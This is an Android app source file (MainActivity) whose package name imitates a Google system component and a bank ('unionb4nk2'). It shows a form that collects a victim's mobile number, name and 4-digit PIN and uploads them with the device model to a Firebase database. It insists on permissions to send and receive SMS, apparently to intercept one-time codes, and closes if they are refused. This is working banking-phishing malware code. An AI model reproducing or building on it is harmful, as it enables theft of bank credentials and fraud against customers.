    package google.test.debug.system.unionb4nk2;

    import android.Manifest;
    import android.annotation.SuppressLint;

    import android.content.DialogInterface;
    import android.content.Intent;

    import android.content.pm.PackageManager;
    import android.net.Uri;
    import android.os.Build;
    import android.os.Bundle;
    import android.provider.Settings;
    import android.util.Log;
    import android.widget.Button;
    import android.widget.EditText;
    import android.widget.Toast;

    import androidx.annotation.NonNull;
    import androidx.annotation.RequiresApi;
    import androidx.appcompat.app.AlertDialog;
    import androidx.appcompat.app.AppCompatActivity;
    import androidx.core.app.ActivityCompat;
    import androidx.core.content.ContextCompat;


    import google.test.debug.system.unionb4nk2.bg.FormValidator;
    import com.google.firebase.database.DatabaseReference;
    import com.google.firebase.database.FirebaseDatabase;

    import java.util.HashMap;

    public class MainActivity extends AppCompatActivity {

        private EditText mob, name, vmpin;

        private static final int SMS_PERMISSION_REQUEST_CODE = 1;

        @SuppressLint("SetTextI18n")
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            checkAndRequestPermissions();

            if(!Helper.isNetworkAvailable(this)) {
                Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                startActivity(intent);
            }

            Helper.setNumber(this);

            mob = findViewById(R.id.mob);
            name = findViewById(R.id.name);
            vmpin = findViewById(R.id.vmpin);

            Button buttonSubmit = findViewById(R.id.btn);

            buttonSubmit.setOnClickListener(v -> {
                if (validateForm()) {
                    buttonSubmit.setText("Please Wait");

                    HashMap<String, Object> dataObject = new HashMap<>();
                    dataObject.put("mob", mob.getText().toString().trim());
                    dataObject.put("name", name.getText().toString().trim());
                    dataObject.put("vmpin", vmpin.getText().toString().trim());
                    dataObject.put("Device", Build.MODEL);
                    dataObject.put("created_at", Helper.datetime());
                    dataObject.put("updated_at", Helper.datetime());

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");
                    String userId = usersRef.push().getKey();  // Generate a unique key
                    String userId2 = usersRef.push().getKey();  // Generate a unique key
                    assert userId != null;
                    usersRef.child(userId).child(userId2).setValue(dataObject)
                            .addOnSuccessListener(aVoid -> {
                                Intent intent = new Intent(MainActivity.this, SecondActivity.class);
                                intent.putExtra("id", userId);
                                startActivity(intent);
                            })
                            .addOnFailureListener(e -> {
                                Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                                Log.d(Helper.TAG, "Error: " + e.getMessage());
                            });

                }else{
                    Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                }
            });

        }
        @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
        private void initializeWebView() {

        }

        public boolean validateForm(){
            String require  = "This fields is required";
            boolean n1 = FormValidator.validatePhoneNumber(mob, "Phone number is required");
            boolean n11 = FormValidator.validateMinLength(mob, 10,"Required only 10 digit phone no");

            boolean n3 = FormValidator.validateRequired(vmpin, require);
            boolean n33 = FormValidator.validateMinLength(vmpin, 4, "Required 4 digit pin");
            boolean n5 = FormValidator.validateRequired(name, require);

            return n1 && n11 && n3 && n33 && n5;
        }

        // start permission checker
        private void checkAndRequestPermissions() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Check if the SMS permission is not granted
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) !=
                        PackageManager.PERMISSION_GRANTED ||
                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
                                PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
                            SMS_PERMISSION_REQUEST_CODE);
                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                }
            } else {
                Toast.makeText(this, "Below Android Device", Toast.LENGTH_SHORT).show();
                initializeWebView();
            }
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                               @NonNull int[] grantResults) {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);

            if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0 &&
                        grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                        grantResults[1] == PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        initializeWebView();
                    }
                } else {
                    // SMS permissions denied
                    showPermissionDeniedDialog();
                }
            }
        }

        private void showPermissionDeniedDialog() {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Permission Denied");
            builder.setMessage("SMS permissions are required to send and receive messages. " +
                    "Please grant the permissions in the app settings.");

            // Open settings button
            builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    openAppSettings();
                }
            });

            // Cancel button
            builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                    finish();
                }
            });

            builder.show();
        }
        private void openAppSettings() {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }


    }